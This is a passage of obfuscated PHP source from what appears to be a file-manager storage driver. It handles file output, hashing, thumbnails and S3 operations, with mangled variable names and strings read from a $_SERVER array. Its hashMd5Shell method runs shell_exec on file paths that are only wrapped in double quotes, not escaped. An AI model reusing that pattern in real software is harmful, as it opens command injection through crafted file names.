trim($this->cdnHost, $ÌÂ¯Óò[8]), $ıçÅÌú); } public function uploadLink($Ì˜“£Éè, $ûˆËÑâœ = 0) { $·Ñ€ûŒï =& $_SERVER[ªÏ§Ë·]; if ($this->isUploadServer()) { return; } $”ÊÒ½ü = $this->getType(); if (!in_array($”ÊÒ½ü, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $‹ùïÉõ = 1024 * 1024 * 10; $á‹ıîú = $ûˆËÑâœ <= $‹ùïÉõ ? $·Ñ€ûŒï[102] : $·Ñ€ûŒï[103]; $»—‰Å ò = (!$ûˆËÑâœ ? 1 : ceil($ûˆËÑâœ / pow(1024, 3))) * 3600 * 4; $ò›àÀİù = $this->{$á‹ıîú}($Ì˜“£Éè, $»—‰Å ò); if ($ò›àÀİù) { $ò›àÀİù[$·Ñ€ûŒï[104]] = $Ì˜“£Éè; $ò›àÀİù[$·Ñ€ûŒï[105]] = $”ÊÒ½ü; } return $ò›àÀİù; } public function uploadFormData($Ôïà¶Šß, $šİ³¨ = 3600) { } public function multiUploadFormData($Àç¯ß÷, $›â†×Ù = 3600) { } public function download($ÉÛ”ÌÑê, $ÜŠ­¿ÉÍ) { } public function ext($Áø¹Ë´ß) { $“şŞ³ — =& $_SERVER[ªÏ§Ë·]; if (strpos($Áø¹Ë´ß, $“şŞ³ —[8]) === -1) { $†«ªò—‚ = $Áø¹Ë´ß; } else { $†«ªò—‚ = $this->pathThis($Áø¹Ë´ß); } $¬ôˆß°â = $“şŞ³ —[12]; if (strstr($†«ªò—‚, $“şŞ³ —[10])) { $¬ôˆß°â = substr($†«ªò—‚, strrpos($†«ªò—‚, $“şŞ³ —[10]) + 1); $¬ôˆß°â = strtolower($¬ôˆß°â); } if (strlen($¬ôˆß°â) > 3 && preg_match($“şŞ³ —[106], $¬ôˆß°â, $Ğ³Ô†’)) { $¬ôˆß°â = $“şŞ³ —[12]; } return $¬ôˆß°â; } public function pathThis($‹¹Ç–¬¼) { $å²¾î =& $_SERVER[ªÏ§Ë·]; $‹¹Ç–¬¼ = str_replace($å²¾î[107], $å²¾î[8], rtrim($‹¹Ç–¬¼, $å²¾î[8])); $ğÏ“ ƒ = strrpos($‹¹Ç–¬¼, $å²¾î[8]); if ($ğÏ“ ƒ === !1) { return $‹¹Ç–¬¼; } return substr($‹¹Ç–¬¼, $ğÏ“ ƒ + 1); } public function pathFather($Œ›Õ¾±”) { $³‰¹åÓá =& $_SERVER[ªÏ§Ë·]; $Œ›Õ¾±” = str_replace($³‰¹åÓá[107], $³‰¹åÓá[8], rtrim($Œ›Õ¾±”, $³‰¹åÓá[8])); $ËÎ’Š‰æ = strrpos($Œ›Õ¾±”, $³‰¹åÓá[8]); if ($ËÎ’Š‰æ === !1) { return $³‰¹åÓá[12]; } return substr($Œ›Õ¾±”, 0, $ËÎ’Š‰æ + 1); } public function hashSimple($›ä…™¡ô) { $±œı×Ç  =& $_SERVER[ªÏ§Ë·]; if (!$›ä…™¡ô) { return md5($±œı×Ç [12]); } $Û„àè÷Ú = $this->size($›ä…™¡ô); $Ñõòƒ€Ë = 200; $¤­êúôÔ = 50; if ($Û„àè÷Ú <= $Ñõòƒ€Ë * $¤­êúôÔ) { return $this->hashMd5($›ä…™¡ô) . $Û„àè÷Ú; } $ÊòÃÇí¢ = intval($Û„àè÷Ú / $¤­êúôÔ); $¿Å‹ÑµŸ = $±œı×Ç [12]; for ($øôÃ´·ç = 0; $øôÃ´·ç < $¤­êúôÔ; $øôÃ´·ç++) { $¿Å‹ÑµŸ .= $this->fileSubstr($›ä…™¡ô, $ÊòÃÇí¢ * $øôÃ´·ç, $Ñõòƒ€Ë); } $¿Å‹ÑµŸ .= $this->fileSubstr($›ä…™¡ô, $Û„àè÷Ú - $Ñõòƒ€Ë, $Ñõòƒ€Ë); return md5($¿Å‹ÑµŸ) . $Û„àè÷Ú; } public static $md5Cache = array(); public function hashMd5($ø…‘õ®İ) { if (!$ø…‘õ®İ) { return md5($_SERVER[ªÏ§Ë·][12]); } $ø…‘õ®İ = $this->iconvSystem($ø…‘õ®İ); if (isset(self::$md5Cache[$ø…‘õ®İ])) { return self::$md5Cache[$ø…‘õ®İ]; } self::$md5Cache[$ø…‘õ®İ] = $this->hashMd5Shell($ø…‘õ®İ); if (!self::$md5Cache[$ø…‘õ®İ]) { self::$md5Cache[$ø…‘õ®İ] = @md5_file($ø…‘õ®İ); } return self::$md5Cache[$ø…‘õ®İ]; } private function hashMd5Shell($¹Öƒîù) { $¥¢Àîø” =& $_SERVER[ªÏ§Ë·]; if (!$¹Öƒîù) { return md5($¥¢Àîø”[12]); } if (!function_exists($¥¢Àîø”[108])) { return !1; } $–ÛšßÙ = array($¥¢Àîø”[109], $¥¢Àîø”[110]); $èŠ•ßü× = Cache::get($¥¢Àîø”[111]); if (!$èŠ•ßü×) { $…À¦ÖıŠ = BASIC_PATH . $¥¢Àîø”[112]; $É–éÉ­˜ = md5_file($…À¦ÖıŠ); $èŠ•ßü× = $¥¢Àîø”[113]; foreach ($–ÛšßÙ as $ÑâÄÅ§) { $Ññùˆ”ö = shell_exec($ÑâÄÅ§ . "\x20\42{$…À¦ÖıŠ}\x22"); if ($Ññùˆ”ö && substr(trim($Ññùˆ”ö), 0, 32) == $É–éÉ­˜) { $èŠ•ßü× = $ÑâÄÅ§; break; } } Cache::set($¥¢Àîø”[111], $èŠ•ßü×, 3600); } if ($èŠ•ßü× == $¥¢Àîø”[113]) { return !1; } $Ññùˆ”ö = shell_exec($èŠ•ßü× . "\x20\42{$¹Öƒîù}\x22"); $Ññùˆ”ö = str_replace($¥¢Àîø”[114], $¥¢Àîø”[12], $Ññùˆ”ö); return substr($Ññùˆ”ö, 0, 32); } public function link($òÚõöÚ¶) { return $òÚõöÚ¶; } public function fileOut($Ñá˜Ö£±, $ó”‘ˆ§‡ = false, $–ˆÚğú = false, $Š€ÏÓĞ = '') { $İÓ…õÍ€ =& $_SERVER[ªÏ§Ë·]; $this->cacheMethod(null, null); if (!$Ñá˜Ö£± || !$this->exist($Ñá˜Ö£±)) { show_json(LNG($İÓ…õÍ€[115]), !1, $–ˆÚğú); } $Ï…Ó²Ğ£ = $this->getType() == $İÓ…õÍ€[116]; $½ßäÜØú = $GLOBALS[$İÓ…õÍ€[6]][$İÓ…õÍ€[99]][$İÓ…õÍ€[117]][$İÓ…õÍ€[118]]; $œ€°ßå¥ = (double) $GLOBALS[$İÓ…õÍ€[6]][$İÓ…õÍ€[99]][$İÓ…õÍ€[117]][$İÓ…õÍ€[119]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $Íç¡±– = $this->infoFull($Ñá˜Ö£±); $ß™ÒéË˜ = $Íç¡±–[$İÓ…õÍ€[86]]; $ ¹ß’º = gmdate($İÓ…õÍ€[120], $Íç¡±–[$İÓ…õÍ€[95]]); $àÏ×ğğí = $–ˆÚğú ? $–ˆÚğú : $this->iconvApp($Íç¡±–[$İÓ…õÍ€[42]]); $ô¢à ÒØ = 0; $µš›Û£Æ = $ß™ÒéË˜ - 1; $Ôß˜ı¶ª = $this->ext($àÏ×ğğí); if (in_array($Ôß˜ı¶ª, array($İÓ…õÍ€[121], $İÓ…õÍ€[122], $İÓ…õÍ€[123], $İÓ…õÍ€[124]))) { $Ôß˜ı¶ª = $İÓ…õÍ€[125]; } if (in_array($Ôß˜ı¶ª, array($İÓ…õÍ€[126]))) { $Ôß˜ı¶ª = $İÓ…õÍ€[127]; } if (!$Š€ÏÓĞ) { $Š€ÏÓĞ = md5($ ¹ß’º . $this->hashSimple($Ñá˜Ö£±)); } $Š€ÏÓĞ = $İÓ…õÍ€[128] . $Š€ÏÓĞ . $İÓ…õÍ€[128]; $æä«ÇšÀ = get_file_mime($Ôß˜ı¶ª); $Å»œ ÍÎ = !0; $Å»œ ÍÎ = isset($_GET[$İÓ…õÍ€[129]]) ? !1 : !0; if ($ó”‘ˆ§‡ === !1 && !mime_support($æä«ÇšÀ)) { $æä«ÇšÀ = $İÓ…õÍ€[130]; } header($İÓ…õÍ€[131]); header($İÓ…õÍ€[132] . $æä«ÇšÀ); $Ü¯ä¤¥Ü = rawurlencode($àÏ×ğğí); $Ü¯ä¤¥Ü = $İÓ…õÍ€[128] . $Ü¯ä¤¥Ü . $İÓ…õÍ€[133] . $Ü¯ä¤¥Ü; if ($ó”‘ˆ§‡) { header($İÓ…õÍ€[134]); header($İÓ…õÍ€[135] . $Ü¯ä¤¥Ü); } else { if ($Å»œ ÍÎ) { header($İÓ…õÍ€[136] . $Ü¯ä¤¥Ü); } } header($İÓ…õÍ€[137] . gmdate($İÓ…õÍ€[120], time() + 3600 * 24 * 30) . $İÓ…õÍ€[138]); header($İÓ…õÍ€[139]); header($İÓ…õÍ€[140]); header($İÓ…õÍ€[141]); if (isset($_SERVER[$İÓ…õÍ€[142]]) && strtotime($_SERVER[$İÓ…õÍ€[142]]) == $Íç¡±–[$İÓ…õÍ€[95]]) { header($İÓ…õÍ€[143], !0, 304); die; } if (isset($_SERVER[$İÓ…õÍ€[144]]) && $_SERVER[$İÓ…õÍ€[144]] == $Š€ÏÓĞ) { header($İÓ…õÍ€[145] . $Š€ÏÓĞ, !0, 304); die; } header($İÓ…õÍ€[145] . $Š€ÏÓĞ); header($İÓ…õÍ€[146] . $ ¹ß’º . $İÓ…õÍ€[138]); header($İÓ…õÍ€[147] . $àÏ×ğğí); header($İÓ…õÍ€[148]); header($İÓ…õÍ€[149] . $ß™ÒéË˜); header($İÓ…õÍ€[150]); if (!$ó”‘ˆ§‡ && $Ôß˜ı¶ª == $İÓ…õÍ€[151]) { if ($ß™ÒéË˜ > 1024 * 1024 * 5) { die; } $Í¬ÁÌÕÙ = $this->getContent($Ñá˜Ö£±); $Í¬ÁÌÕÙ = Html::clearSVG($Í¬ÁÌÕÙ); header($İÓ…õÍ€[152] . strlen($Í¬ÁÌÕÙ)); echo $Í¬ÁÌÕÙ; die; } $Ë¹ºû²¤ = strtolower($_SERVER[$İÓ…õÍ€[153]]); if ($Ï…Ó²Ğ£ && $Ë¹ºû²¤ && $½ßäÜØú) { if (strstr($Ë¹ºû²¤, $İÓ…õÍ€[154])) { header($İÓ…õÍ€[155] . $Ñá˜Ö£±); } else { if (strstr($Ë¹ºû²¤, $İÓ…õÍ€[156])) { header($İÓ…õÍ€[157] . $Ñá˜Ö£±); } else { if (strstr($Ë¹ºû²¤, $İÓ…õÍ€[158])) { header($İÓ…õÍ€[159] . $Ñá˜Ö£±); } } } if ($œ€°ßå¥) { header($İÓ…õÍ€[160] . $œ€°ßå¥); } return; } if (isset($_SERVER[$İÓ…õÍ€[161]])) { if (preg_match($İÓ…õÍ€[162], $_SERVER[$İÓ…õÍ€[161]], $³âš‘)) { $ô¢à ÒØ = intval($³âš‘[1]); $ô¢à ÒØ = $ô¢à ÒØ <= 0 ? 0 : ($ô¢à ÒØ >= $µš›Û£Æ ? $µš›Û£Æ : $ô¢à ÒØ); if (!empty($³âš‘[2])) { $µ¢Ûî½û = intval($³âš‘[2]); $µš›Û£Æ = $µ¢Ûî½û < $ô¢à ÒØ ? $ô¢à ÒØ : ($µ¢Ûî½û >= $µš›Û£Æ ? $µš›Û£Æ : $µ¢Ûî½û); } } header($İÓ…õÍ€[163]); header("\103\157\156\164\x65\x6e\164\55\x52\141\156\x67\x65\x3a\x20\x62\x79\164\x65\x73\40{$ô¢à ÒØ}\x2d{$µš›Û£Æ}\x2f" . $ß™ÒéË˜); } else { header($İÓ…õÍ€[164]); } header($İÓ…õÍ€[165]); $¦ÊÁÑì = !0; if ($_SERVER[$İÓ…õÍ€[166]] == $İÓ…õÍ€[167] && $ß™ÒéË˜ > 1204 * 1024 * 1024 * 2) { $¦ÊÁÑì = !1; } if ($¦ÊÁÑì) { header($İÓ…õÍ€[168] . ($µš›Û£Æ - $ô¢à ÒØ + 1)); } if ($_SERVER[$İÓ…õÍ€[169]] == $İÓ…õÍ€[170]) { return; } $†óşªíä = 1024 * 100; $óœ¹ıû‹ = 0; if ($œ€°ßå¥) { $óœ¹ıû‹ = intval(1000 * 1000 * ($†óşªíä / $œ€°ßå¥)); } while ($ô¢à ÒØ <= $µš›Û£Æ) { $ÙÁÍññ¯ = timeFloat(); check_abort(); $¾Üëˆ®¶ = $µš›Û£Æ - $ô¢à ÒØ + 1; if ($¾Üëˆ®¶ <= $†óşªíä) { $†óşªíä = $¾Üëˆ®¶; } echo $this->fileSubstr($Ñá˜Ö£±, $ô¢à ÒØ, $†óşªíä); $ô¢à ÒØ += $†óşªíä; if ($†óşªíä == $¾Üëˆ®¶) { $ô¢à ÒØ = $µš›Û£Æ + 1; } if ($óœ¹ıû‹) { $©¥“££­ = intval(1000 * 1000 * (timeFloat() - $ÙÁÍññ¯)); $‘˜èó’¿ = $óœ¹ıû‹ - $©¥“££­; if ($‘˜èó’¿ > 5) { usleep($‘˜èó’¿); } } } } public function fileOutServer($œŠæšš´, $€óë¿¬Õ = false, $Á‘œ¾³¤ = false, $şÍ«óŒÌ = '') { $this->fileOut($œŠæšš´, $€óë¿¬Õ, $Á‘œ¾³¤, $şÍ«óŒÌ); } public function fileOutLink($ã›Šó§‡) { header($_SERVER[ªÏ§Ë·][171] . $ã›Šó§‡); die; } public function cacheMethod($½‹ƒãÆ, $Ê‹ä‰Œñ, $İØÛ“´ƒ = null) { $³±ËÔÛ• =& $_SERVER[ªÏ§Ë·]; static $÷ ËÆÂ‘ = array(); $ü§ ±´´ = $Ê‹ä‰Œñ ? ltrim($this->getPathOuter($Ê‹ä‰Œñ), $³±ËÔÛ•[8]) : $³±ËÔÛ•[12]; $ã‚™¥àÑ = $³±ËÔÛ•[172] . $½‹ƒãÆ . $³±ËÔÛ•[173] . rtrim($ü§ ±´´, $³±ËÔÛ•[8]); if (is_null($½‹ƒãÆ)) { $÷ ËÆÂ‘ = array(); return; } if (is_null($Ê‹ä‰Œñ)) { foreach ($÷ ËÆÂ‘ as $ã‚™¥àÑ => $ˆù¾¢ìú) { if (!strstr($ã‚™¥àÑ, $³±ËÔÛ•[172] . $½‹ƒãÆ . $³±ËÔÛ•[174])) { continue; } unset($÷ ËÆÂ‘[$ã‚™¥àÑ]); } return; } if (!is_null($İØÛ“´ƒ)) { $÷ ËÆÂ‘[$ã‚™¥àÑ] = $İØÛ“´ƒ; return; } $ä¿¶£Ì¼ = isset($÷ ËÆÂ‘[$ã‚™¥àÑ]) ? $÷ ËÆÂ‘[$ã‚™¥àÑ] : null; if (!is_null($ä¿¶£Ì¼)) { return $ä¿¶£Ì¼; } $ä¿¶£Ì¼ = $this->{$½‹ƒãÆ}($Ê‹ä‰Œñ); $÷ ËÆÂ‘[$ã‚™¥àÑ] = $ä¿¶£Ì¼; return $ä¿¶£Ì¼; } public function cacheMethodInfoSet($…ŒÒ¼ù, $ñÕ×¹, $Ò÷ë‚ç– = false) { $½ È€Ó‚ =& $_SERVER[ªÏ§Ë·]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($½ È€Ó‚[175], $…ŒÒ¼ù, $ñÕ×¹); $this->cacheMethod($½ È€Ó‚[176], $…ŒÒ¼ù, $ñÕ×¹ ? !1 : !0); if (is_array($Ò÷ë‚ç–)) { $this->cacheMethod($½ È€Ó‚[177], $…ŒÒ¼ù, $Ò÷ë‚ç–); } } public function fileOutImage($±ÁŠ¼ü›, $¾µ¶¡Ø‚ = 250) { $’æ™Œ =& $_SERVER[ªÏ§Ë·]; set_timeout(); if (substr($±ÁŠ¼ü›, 0, 4) == $’æ™Œ[158]) { $this->fileOutLink($±ÁŠ¼ü›); } $Ôç©½‹ = $this->info($±ÁŠ¼ü›); $Î‡§× = $Ôç©½‹[$’æ™Œ[42]]; $ÛÚàÄë = !1; if (isset($GLOBALS[$’æ™Œ[178]]) && $GLOBALS[$’æ™Œ[178]][$’æ™Œ[94]] == $Ôç©½‹[$’æ™Œ[94]]) { $ËËüó¼ = $GLOBALS[$’æ™Œ[178]][$’æ™Œ[179]]; if (!$Ôç©½‹[$’æ™Œ[180]]) { $Ôç©½‹[$’æ™Œ[180]] = $GLOBALS[$’æ™Œ[178]]; } if (isset($ËËüó¼[$’æ™Œ[181]])) { if ($ËËüó¼[$’æ™Œ[181]] <= $¾µ¶¡Ø‚ && $ËËüó¼[$’æ™Œ[182]] <= $¾µ¶¡Ø‚) { $ÛÚàÄë = !0; } } $Î‡§× = $Ôç©½‹[$’æ™Œ[180]][$’æ™Œ[42]]; } if ($Ôç©½‹[$’æ™Œ[86]] <= 1024 * 50 || $ÛÚàÄë || !function_exists($’æ™Œ[183]) || $Ôç©½‹[$’æ™Œ[184]] == $’æ™Œ[185]) { return $this->fileOut($±ÁŠ¼ü›, !1, $Î‡§×); } if (isset($Ôç©½‹[$’æ™Œ[180]][$’æ™Œ[186]])) { $é†åî±Ú = $Ôç©½‹[$’æ™Œ[180]][$’æ™Œ[186]]; } else { if (isset($Ôç©½‹[$’æ™Œ[180]][$’æ™Œ[187]])) { $é†åî±Ú = $Ôç©½‹[$’æ™Œ[180]][$’æ™Œ[187]]; } } if (!$é†åî±Ú) { $é†åî±Ú = md5("{$Ôç©½‹[$’æ™Œ[42]]}\x5f{$Ôç©½‹[$’æ™Œ[94]]}\137{$Ôç©½‹[$’æ™Œ[86]]}\137{$¾µ¶¡Ø‚}"); } $“Û„ÙÉî = "{$é†åî±Ú}\137{$¾µ¶¡Ø‚}\56\x70\156\x67"; if (!($óÏğ¹¥ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $’æ™Œ[188]))) { $ĞÇ’„ª± = IO::mkdir(IO_PATH_SYSTEM_TEMP . $’æ™Œ[189]); } else { $ĞÇ’„ª± = KodIO::make($óÏğ¹¥); } if ($óÏğ¹¥ = IO::fileNameExist($ĞÇ’„ª±, $“Û„ÙÉî)) { $áæÕ€Şë = KodIO::make($óÏğ¹¥); return IO::fileOut($áæÕ€Şë, !1, $Î‡§×); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $áæÕ€Şë = DATA_THUMB . $“Û„ÙÉî; del_file($áæÕ€Şë); if (!@file_exists($áæÕ€Şë)) { $§¤÷§ôİ = TEMP_FILES; if (!is_dir($§¤÷§ôİ)) { mk_dir($§¤÷§ôİ); } $à¹ÀÓ“µ = $§¤÷§ôİ . $é†åî±Ú . $’æ™Œ[10] . $Ôç©½‹[$’æ™Œ[184]]; if (!@file_exists($à¹ÀÓ“µ)) { $à¹ÀÓ“µ = $this->download($±ÁŠ¼ü›, $à¹ÀÓ“µ); } ImageThumb::createThumb($à¹ÀÓ“µ, $áæÕ€Şë, $¾µ¶¡Ø‚, $¾µ¶¡Ø‚ * 10); } if (!file_exists($áæÕ€Şë) || filesize($áæÕ€Şë) < 100) { return @file_exists($à¹ÀÓ“µ) ? IO::fileOut($à¹ÀÓ“µ) : $this->fileOut($±ÁŠ¼ü›); } if (!($Ö´è •š = IO::move($áæÕ€Şë, $ĞÇ’„ª±))) { return IO::fileOut($áæÕ€Şë); } del_file($áæÕ€Şë); IO::fileOut($Ö´è •š); } public function fileOutImageServer($Éî÷å¹, $¶Á÷Ş¬ = 250) { $this->fileOutImage($Éî÷å¹, $¶Á÷Ş¬); } public function fileNameAuto($³ˆ¦Ó¼õ, $‰¤¼ÙÒÜ, $±ö¡»‡ = REPEAT_RENAME, $‚÷Û‚‰Ô = false) { $ˆá‘éåõ =& $_SERVER[ªÏ§Ë·]; $¯èÄá¬Û = $³ˆ¦Ó¼õ === $ˆá‘éåõ[12] ? $‰¤¼ÙÒÜ : rtrim($³ˆ¦Ó¼õ, $ˆá‘éåõ[8]) . $ˆá‘éåõ[8] . $‰¤¼ÙÒÜ; if ($±ö¡»‡ == REPEAT_REPLACE || !$this->exist($¯èÄá¬Û) || $‚÷Û‚‰Ô && $±ö¡»‡ != REPEAT_RENAME_FOLDER) { return $‰¤¼ÙÒÜ; } if ($±ö¡»‡ == REPEAT_SKIP) { return !1; } $×µî§¿ö = $ˆá‘éåõ[10] . get_path_ext($‰¤¼ÙÒÜ); $×µî§¿ö = $×µî§¿ö == $ˆá‘éåõ[10] || $‚÷Û‚‰Ô ? $ˆá‘éåõ[12] : $×µî§¿ö; $…ò«Òæ = 1; $÷·ÅÁææ = substr($‰¤¼ÙÒÜ, 0, strlen($‰¤¼ÙÒÜ) - strlen($×µî§¿ö)); $«´×ì¨  = $÷·ÅÁææ . "\50{$…ò«Òæ}\x29{$×µî§¿ö}"; while ($this->exist(rtrim($³ˆ¦Ó¼õ, $ˆá‘éåõ[8]) . $ˆá‘éåõ[8] . $«´×ì¨ )) { $«´×ì¨  = $÷·ÅÁææ . "\x28{$…ò«Òæ}\51{$×µî§¿ö}"; $…ò«Òæ++; } return $«´×ì¨ ; } private function fileNameAutoList($‹ÅèÑõá, $…ß¡©è, $˜§ÚÛ÷ = false) { $öÍÓâ’Û =& $_SERVER[ªÏ§Ë·]; $¬Õ÷Ø = $this->listPath($‹ÅèÑõá, !0); $¬Õ÷Ø = array_merge($¬Õ÷Ø[$öÍÓâ’Û[92]], $¬Õ÷Ø[$öÍÓâ’Û[93]]); $²‚éÕöÅ = array_to_keyvalue($¬Õ÷Ø, $öÍÓâ’Û[12], $öÍÓâ’Û[42]); $Øˆ¨ÇãË = $öÍÓâ’Û[10] . get_path_ext($…ß¡©è); $Øˆ¨ÇãË = $Øˆ¨ÇãË == $öÍÓâ’Û[10] || $˜§ÚÛ÷ ? $öÍÓâ’Û[12] : $Øˆ¨ÇãË; $å¨ó¤Ó = substr($…ß¡©è, 0, strlen($…ß¡©è) - strlen($Øˆ¨ÇãË)); $»âØ¸» = $å¨ó¤Ó . "\50\x30\x29{$Øˆ¨ÇãË}"; for ($ëæÇ‡ ¸ = 1; $ëæÇ‡ ¸ <= count($²‚éÕöÅ) + 1; $ëæÇ‡ ¸++) { $»âØ¸» = $å¨ó¤Ó . "\x28{$ëæÇ‡ ¸}\x29{$Øˆ¨ÇãË}"; if (!in_array_not_case($»âØ¸», $²‚éÕöÅ)) { return $»âØ¸»; } } return $»âØ¸»; } public function listAllFiles($Ë‹™õÄã, $Ï´îÆä­) { $‘ü€ûÙ =& $_SERVER[ªÏ§Ë·]; if (empty($Ï´îÆä­)) { return array(); } $ÇŞòê·ö = array_keys($Ï´îÆä­); $ßìÚıúî = array(); $Ë‹™õÄã = trim($Ë‹™õÄã, $‘ü€ûÙ[8]); foreach ($Ï´îÆä­ as $¾µàïëÜ => $ªŠæ£îƒ) { $ùÊÒâà¦ = ltrim(substr(trim($¾µàïëÜ, $‘ü€ûÙ[8]), strlen($Ë‹™õÄã)), $‘ü€ûÙ[8]); if (substr($¾µàïëÜ, -1) == $‘ü€ûÙ[8]) { $ùÊÒâà¦ = rtrim($ùÊÒâà¦, $‘ü€ûÙ[8]) . $‘ü€ûÙ[8]; } $ßìÚıúî = array_merge($ßìÚıúî, $this->slicePath($ùÊÒâà¦)); } $†ë‰Å¿õ = array(); foreach (array_unique($ßìÚıúî) as $ƒ·ˆóÍà) { $š¸Ÿñ— = array($‘ü€ûÙ[94] => $this->getPathOuter($‘ü€ûÙ[8] . $Ë‹™õÄã . $‘ü€ûÙ[8] . $ƒ·ˆóÍà), $‘ü€ûÙ[85] => 1, $‘ü€ûÙ[86] => 0); if (substr($ƒ·ˆóÍà, -1) != $‘ü€ûÙ[8]) { $š¸Ÿñ—[$‘ü€ûÙ[85]] = 0; $½öî„í = $this->getPath($Ë‹™õÄã . $‘ü€ûÙ[8] . $ƒ·ˆóÍà); if (isset($Ï´îÆä­[$½öî„í])) { $‡ÁÑ°ç˜ = $Ï´îÆä­[$½öî„í]; if (isset($‡ÁÑ°ç˜[$‘ü€ûÙ[86]])) { $š¸Ÿñ—[$‘ü€ûÙ[86]] = intval($‡ÁÑ°ç˜[$‘ü€ûÙ[86]]); } if (isset($‡ÁÑ°ç˜[$‘ü€ûÙ[190]])) { $š¸Ÿñ—[$‘ü€ûÙ[95]] = intval($‡ÁÑ°ç˜[$‘ü€ûÙ[190]]); } } } $†ë‰Å¿õ[] = $š¸Ÿñ—; } return $†ë‰Å¿õ; } public function slicePath($ù¢«Æã) { $ïšªÁ‹ =& $_SERVER[ªÏ§Ë·]; $·¸»Ğúå = explode($ïšªÁ‹[8], trim($ù¢«Æã, $ïšªÁ‹[8])); $ä×›òÁ = 0; do { ++$ä×›òÁ; $ÍÊ¬è‘[] = implode($ïšªÁ‹[8], array_slice($·¸»Ğúå, 0, $ä×›òÁ)) . $ïšªÁ‹[8]; } while ($ä×›òÁ < count($·¸»Ğúå)); $ÍÊ¬è‘[count($·¸»Ğúå) - 1] = $ù¢«Æã; return $ÍÊ¬è‘; } public function getHost() { $äÁòÜºà =& $_SERVER[ªÏ§Ë·]; $ó¨šü¦Ö = parse_url(trim($this->domain, $äÁòÜºà[8])); $ßô¥ÈáÆ = isset($ó¨šü¦Ö[$äÁòÜºà[191]]) ? $ó¨šü¦Ö[$äÁòÜºà[191]] : http_type(); $ü¥¸ğØ× = isset($ó¨šü¦Ö[$äÁòÜºà[192]]) ? $ó¨šü¦Ö[$äÁòÜºà[192]] : $ó¨šü¦Ö[$äÁòÜºà[94]]; if (isset($ó¨šü¦Ö[$äÁòÜºà[193]])) { $ü¥¸ğØ× .= $äÁòÜºà[4] . $ó¨šü¦Ö[$äÁòÜºà[193]]; } return $ßô¥ÈáÆ . $äÁòÜºà[194] . $ü¥¸ğØ×; } public function pathEncode($ÇãŒ–°¡) { $‚èúøÉ =& $_SERVER[ªÏ§Ë·]; return str_replace($‚èúøÉ[195], $‚èúøÉ[8], rawurlencode($ÇãŒ–°¡)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($Ç¼ˆÚ›) { set_timeout(); require_once SDK_DIR . $_SERVER[ªÏ§Ë·][196]; parent::__construct(); $this->_init($Ç¼ˆÚ›); } public function _init($ÈÛ€åøÃ) { $this->config = $ÈÛ€åøÃ; foreach ($ÈÛ€åøÃ as $Ë’ô¢ıµ => $¹­îÓç) { if (isset($this->{$Ë’ô¢ıµ})) { $this->{$Ë’ô¢ıµ} = $¹­îÓç; } } $this->endpoint = $ÈÛ€åøÃ[$_SERVER[ªÏ§Ë·][197]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($”ĞÀŠšº = "\166\x34") { $this->signVer = $”ĞÀŠšº; $this->client->setSignatureVersion($”ĞÀŠšº); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $±ê°ˆÚƒ =& $_SERVER[ªÏ§Ë·]; $ù»²ôöª = $this->getBucketCors(); if (!$ù»²ôöª || !is_array($ù»²ôöª)) { return !1; } if ($ù»²ôöª[$±ê°ˆÚƒ[198]] != $±ê°ˆÚƒ[199] || $ù»²ôöª[$±ê°ˆÚƒ[200]] != $±ê°ˆÚƒ[199]) { return !1; } $ŸŸ©ÑÓ = array_map($±ê°ˆÚƒ[201], $ù»²ôöª[$±ê°ˆÚƒ[202]]); if (!is_array($ŸŸ©ÑÓ)) { $ŸŸ©ÑÓ = array(); } $¤ß‘Ş± = array($±ê°ˆÚƒ[203], $±ê°ˆÚƒ[204], $±ê°ˆÚƒ[205], $±ê°ˆÚƒ[206], $±ê°ˆÚƒ[207]); $×¿òïË = array_diff($¤ß‘Ş±, $ŸŸ©ÑÓ); return empty($×¿òïË); } public function mkfile($ÇúºÅÁ, $üÆÁî­© = '', $Ö’ø’çß = REPEAT_RENAME) { $¯şÇÎí€ = $this->setContent($ÇúºÅÁ, $üÆÁî­©); if ($¯şÇÎí€ !== !1) { return $this->getPathOuter($ÇúºÅÁ); } return !1; } public function mkdir($Èİ³¥â, $»ØËÏ’À = REPEAT_SKIP) { $¢»–Í›„ =& $_SERVER[ªÏ§Ë·]; if (empty($Èİ³¥â) && $Èİ³¥â !== $¢»–Í›„[208]) { return !1; } if ($»ØËÏ’À && $this->_isFolder($Èİ³¥â)) { return $this->getPathOuter($Èİ³¥â); } $µ·ªù†õ = $this->setContent($Èİ³¥â, $¢»–Í›„[12], !0); if ($µ·ªù†õ !== !1) { return $this->getPathOuter($Èİ³¥â); } return !1; } public function copyFile($ÌªŒó, $¥òåòí, $€ªşÎ‚ = array()) { $ßå˜ÃÛª =& $_SERVER[ªÏ§Ë·]; $÷ñ‹”—¾ = $this->objectMeta($ÌªŒó); if (!$÷ñ‹”—¾) { return !1; } if ($÷ñ‹”—¾[$ßå˜ÃÛª[86]] <= 1024 * 1024 * 200) { $²ĞªòûŸ = $this->client->copyObject($this->bucket, $ÌªŒó, $this->bucket, $¥òåòí, $ßå˜ÃÛª[209], $€ªşÎ‚); } else { $²ĞªòûŸ = $this->client->multiCopyObject($this->bucket, $ÌªŒó, $this->bucket, $¥òåòí, $€ªşÎ‚); } $²ĞªòûŸ = $²ĞªòûŸ ? $this->getPathOuter($¥òåòí) : !1; return $²ĞªòûŸ; } public function moveFile($áê€¡£, $×±Òİ³‚) { if ($this->copyFile($áê€¡£, $×±Òİ³‚)) { $this->delFile($áê€¡£); return $this->getPathOuter($×±Òİ³‚); } return !1; } public function delFile($Ûù’ß½î) { return $this->client->deleteObject($this->bucket, $Ûù’ß½î); } public function delFolder($ĞúãÁ‹) { $ñö¬…©¼ =& $_SERVER[ªÏ§Ë·]; if (!$this->exist($ĞúãÁ‹)) { return !0; } $this->listItemCache = !1; $æÓæ´İ = 